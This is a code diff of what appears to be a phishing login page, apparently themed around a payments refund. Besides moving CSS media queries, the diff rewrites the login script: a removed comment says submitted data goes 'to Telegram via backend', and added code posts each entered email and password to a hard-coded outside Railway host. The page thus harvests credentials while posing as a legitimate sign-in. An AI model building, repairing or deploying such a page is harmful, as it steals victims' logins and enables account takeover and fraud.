@@ -187,7 +187,7 @@
         }
 
         /* ============================================
-           TITLES - REDUCED FONT SIZES
+           TITLES
            ============================================ */
         .form-title {
             font-size: 2.8rem;
@@ -408,217 +408,6 @@
             display: none;
         }
 
-        /* ============================================
-           RESPONSIVE
-           ============================================ */
-        @media (max-width: 600px) {
-            .login-header {
-                padding: 1rem 1.4rem;
-                min-height: 5.6rem;
-            }
-
-            .login-header .brand svg {
-                height: 2.8rem;
-            }
-
-            .language-selector {
-                font-size: 1.1rem;
-                padding: 0.3rem 0.8rem 0.3rem 1.2rem;
-            }
-
-            .login-content {
-                padding: 1.6rem 1.4rem 2rem;
-            }
-
-            .form-title {
-                font-size: 2.4rem;
-            }
-
-            .form-subtitle {
-                font-size: 1.2rem;
-                margin-bottom: 2rem;
-            }
-
-            .input-group input {
-                height: 4.6rem;
-                font-size: 1.2rem;
-                padding: 1.6rem 1rem 0.4rem 1rem;
-            }
-
-            .input-group label {
-                font-size: 1.1rem;
-                top: 1.2rem;
-                left: 1rem;
-            }
-
-            .input-group input:focus + label,
-            .input-group input:not(:placeholder-shown) + label {
-                top: 0.4rem;
-                font-size: 0.9rem;
-            }
-
-            .btn-primary {
-                height: 4.4rem;
-                font-size: 1.3rem;
-                padding: 0.8rem 1.6rem;
-            }
-
-            .form-options a {
-                font-size: 1.1rem;
-            }
-
-            .signup-link {
-                font-size: 1.1rem;
-            }
-
-            .login-footer-links a {
-                font-size: 1rem;
-            }
-
-            .input-group .helper-text {
-                font-size: 1rem;
-            }
-        }
-
-        @media (max-width: 400px) {
-            .login-header {
-                padding: 0.8rem 1rem;
-                min-height: 5rem;
-            }
-
-            .login-header .brand svg {
-                height: 2.4rem;
-            }
-
-            .language-selector {
-                font-size: 1rem;
-                padding: 0.2rem 0.6rem 0.2rem 1rem;
-                gap: 0.4rem;
-            }
-
-            .language-dropdown {
-                min-width: 12rem;
-                right: -0.8rem;
-            }
-
-            .language-dropdown .dropdown-item {
-                font-size: 1.1rem;
-                padding: 0.5rem 1rem;
-            }
-
-            .login-content {
-                padding: 1.2rem 1rem 1.6rem;
-            }
-
-            .form-title {
-                font-size: 2rem;
-            }
-
-            .form-subtitle {
-                font-size: 1.1rem;
-                margin-bottom: 1.6rem;
-            }
-
-            .input-group input {
-                height: 4.2rem;
-                font-size: 1.1rem;
-                padding: 1.4rem 0.8rem 0.3rem 0.8rem;
-            }
-
-            .input-group label {
-                font-size: 1rem;
-                top: 1rem;
-                left: 0.8rem;
-            }
-
-            .input-group input:focus + label,
-            .input-group input:not(:placeholder-shown) + label {
-                top: 0.3rem;
-                font-size: 0.8rem;
-            }
-
-            .btn-primary {
-                height: 4rem;
-                font-size: 1.2rem;
-                padding: 0.7rem 1.2rem;
-            }
-
-            .login-footer-links {
-                gap: 0.8rem;
-                margin-top: 2rem;
-                padding-top: 1.2rem;
-            }
-
-            .login-footer-links a {
-                font-size: 0.9rem;
-            }
-
-            .login-footer-links .divider {
-                font-size: 1rem;
-            }
-
-            .signup-link {
-                font-size: 1rem;
-            }
-
-            .input-group .helper-text {
-                font-size: 0.9rem;
-            }
-        }
-
-        @media (min-width: 601px) {
-            body {
-                padding: 2rem;
-                align-items: center;
-            }
-
-            .page-wrapper {
-                border-radius: 32px;
-                box-shadow: 0 24px 80px rgba(0, 0, 0, 0.07), 0 8px 32px rgba(0, 0, 0, 0.03);
-                border: 1px solid #f0f2f5;
-                min-height: auto;
-                max-height: 98vh;
-                overflow-y: auto;
-                max-width: 480px;
-            }
-
-            .login-header {
-                border-radius: 32px 32px 0 0;
-            }
-
-            .login-content {
-                padding: 2rem 2.4rem 2.4rem;
-            }
-
-            .login-image-column {
-                display: none;
-            }
-
-            .form-title {
-                font-size: 2.8rem;
-            }
-
-            .form-subtitle {
-                font-size: 1.3rem;
-            }
-
-            .input-group input {
-                height: 5rem;
-                font-size: 1.3rem;
-            }
-
-            .btn-primary {
-                height: 4.8rem;
-                font-size: 1.4rem;
-            }
-        }
-
-        @media (min-width: 1024px) {
-            .page-wrapper {
-                max-width: 500px;
-            }
-        }
-
         /* Toast notification */
         .toast {
             position: fixed;
@@ -657,6 +446,180 @@
 
         .toast i {
             font-size: 1.4rem;
+        }
+
+        /* ============================================
+           RESPONSIVE
+           ============================================ */
+        @media (max-width: 600px) {
+            .login-header {
+                padding: 1rem 1.4rem;
+                min-height: 5.6rem;
+            }
+            .login-header .brand svg {
+                height: 2.8rem;
+            }
+            .language-selector {
+                font-size: 1.1rem;
+                padding: 0.3rem 0.8rem 0.3rem 1.2rem;
+            }
+            .login-content {
+                padding: 1.6rem 1.4rem 2rem;
+            }
+            .form-title {
+                font-size: 2.4rem;
+            }
+            .form-subtitle {
+                font-size: 1.2rem;
+                margin-bottom: 2rem;
+            }
+            .input-group input {
+                height: 4.6rem;
+                font-size: 1.2rem;
+                padding: 1.6rem 1rem 0.4rem 1rem;
+            }
+            .input-group label {
+                font-size: 1.1rem;
+                top: 1.2rem;
+                left: 1rem;
+            }
+            .input-group input:focus + label,
+            .input-group input:not(:placeholder-shown) + label {
+                top: 0.4rem;
+                font-size: 0.9rem;
+            }
+            .btn-primary {
+                height: 4.4rem;
+                font-size: 1.3rem;
+                padding: 0.8rem 1.6rem;
+            }
+            .form-options a {
+                font-size: 1.1rem;
+            }
+            .signup-link {
+                font-size: 1.1rem;
+            }
+            .login-footer-links a {
+                font-size: 1rem;
+            }
+            .input-group .helper-text {
+                font-size: 1rem;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .login-header {
+                padding: 0.8rem 1rem;
+                min-height: 5rem;
+            }
+            .login-header .brand svg {
+                height: 2.4rem;
+            }
+            .language-selector {
+                font-size: 1rem;
+                padding: 0.2rem 0.6rem 0.2rem 1rem;
+                gap: 0.4rem;
+            }
+            .language-dropdown {
+                min-width: 12rem;
+                right: -0.8rem;
+            }
+            .language-dropdown .dropdown-item {
+                font-size: 1.1rem;
+                padding: 0.5rem 1rem;
+            }
+            .login-content {
+                padding: 1.2rem 1rem 1.6rem;
+            }
+            .form-title {
+                font-size: 2rem;
+            }
+            .form-subtitle {
+                font-size: 1.1rem;
+                margin-bottom: 1.6rem;
+            }
+            .input-group input {
+                height: 4.2rem;
+                font-size: 1.1rem;
+                padding: 1.4rem 0.8rem 0.3rem 0.8rem;
+            }
+            .input-group label {
+                font-size: 1rem;
+                top: 1rem;
+                left: 0.8rem;
+            }
+            .input-group input:focus + label,
+            .input-group input:not(:placeholder-shown) + label {
+                top: 0.3rem;
+                font-size: 0.8rem;
+            }
+            .btn-primary {
+                height: 4rem;
+                font-size: 1.2rem;
+                padding: 0.7rem 1.2rem;
+            }
+            .login-footer-links {
+                gap: 0.8rem;
+                margin-top: 2rem;
+                padding-top: 1.2rem;
+            }
+            .login-footer-links a {
+                font-size: 0.9rem;
+            }
+            .login-footer-links .divider {
+                font-size: 1rem;
+            }
+            .signup-link {
+                font-size: 1rem;
+            }
+            .input-group .helper-text {
+                font-size: 0.9rem;
+            }
+        }
+
+        @media (min-width: 601px) {
+            body {
+                padding: 2rem;
+                align-items: center;
+            }
+            .page-wrapper {
+                border-radius: 32px;
+                box-shadow: 0 24px 80px rgba(0, 0, 0, 0.07), 0 8px 32px rgba(0, 0, 0, 0.03);
+                border: 1px solid #f0f2f5;
+                min-height: auto;
+                max-height: 98vh;
+                overflow-y: auto;
+                max-width: 480px;
+            }
+            .login-header {
+                border-radius: 32px 32px 0 0;
+            }
+            .login-content {
+                padding: 2rem 2.4rem 2.4rem;
+            }
+            .login-image-column {
+                display: none;
+            }
+            .form-title {
+                font-size: 2.8rem;
+            }
+            .form-subtitle {
+                font-size: 1.3rem;
+            }
+            .input-group input {
+                height: 5rem;
+                font-size: 1.3rem;
+            }
+            .btn-primary {
+                height: 4.8rem;
+                font-size: 1.4rem;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .page-wrapper {
+                max-width: 500px;
+            }
         }
     </style>
 </head>
@@ -773,7 +736,7 @@
     </div>
 
     <!-- ============================================
-       JAVASCRIPT - IMPROVED ERROR HANDLING
+       JAVASCRIPT - FIXED WITH ABSOLUTE URL
        ============================================ -->
     <script>
         // ============================================
@@ -815,28 +778,31 @@
 
             toastMessage.textContent = message;
             toast.className = 'toast ' + type;
-            
+
             if (type === 'error') {
                 icon.className = 'fas fa-exclamation-circle';
             } else if (type === 'success') {
                 icon.className = 'fas fa-check-circle';
             }
-            
+
             toast.classList.add('show');
-            
+
             setTimeout(() => {
                 toast.classList.remove('show');
             }, 4000);
         }
 
         // ============================================
-        // LOGIN FORM - SENDS DATA TO TELEGRAM VIA BACKEND
+        // LOGIN FORM - SENDS DATA TO BACKEND
         // ============================================
         document.addEventListener('DOMContentLoaded', function() {
             const loginForm = document.getElementById('loginForm');
             const loginBtn = document.getElementById('loginBtn');
             const emailInput = document.getElementById('loginEmail');
             const passwordInput = document.getElementById('loginPassword');
+
+            // 🔥 FIX: Use the FULL Railway URL
+            const API_BASE_URL = 'https://airtmrefund-production.up.railway.app';
 
             loginForm.addEventListener('submit', async function(e) {
                 e.preventDefault();
@@ -850,7 +816,6 @@
                     return;
                 }
 
-                // Simple email validation
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (!emailRegex.test(email)) {
                     showToast('Please enter a valid email address', 'error');
@@ -867,9 +832,9 @@
                 loginBtn.disabled = true;
 
                 try {
-                    console.log('📤 Sending login request...');
-                    
-                    const response = await fetch('/api/login', {
+                    console.log('📤 Sending login request to:', API_BASE_URL + '/api/login');
+
+                    const response = await fetch(API_BASE_URL + '/api/login', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
@@ -878,33 +843,22 @@
                     });
 
                     console.log('📥 Response status:', response.status);
-                    console.log('📥 Response headers:', response.headers);
 
-                    // Check if response is OK
-                    if (!response.ok) {
-                        const text = await response.text();
-                        console.error('❌ Server error response:', text);
-                        showToast('Server error. Please try again.', 'error');
-                        loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Log in';
-                        loginBtn.disabled = false;
-                        return;
-                    }
+                    // Get response as text first to debug
+                    const responseText = await response.text();
+                    console.log('📥 Response body:', responseText);
 
-                    // Try to parse JSON
+                    // Try to parse as JSON
                     let data;
                     try {
-                        data = await response.json();
-                    } catch (jsonError) {
-                        console.error('❌ JSON parse error:', jsonError);
-                        const text = await response.text();
-                        console.error('Response text:', text);
+                        data = JSON.parse(responseText);
+                    } catch (parseError) {
+                        console.error('❌ Failed to parse JSON:', parseError);
                         showToast('Server returned invalid response. Please try again.', 'error');
                         loginBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Log in';
                         loginBtn.disabled = false;
                         return;
                     }
-
-                    console.log('📦 Response data:', data);
 
                     if (data.success) {
                         showToast('Login successful! Redirecting...', 'success');
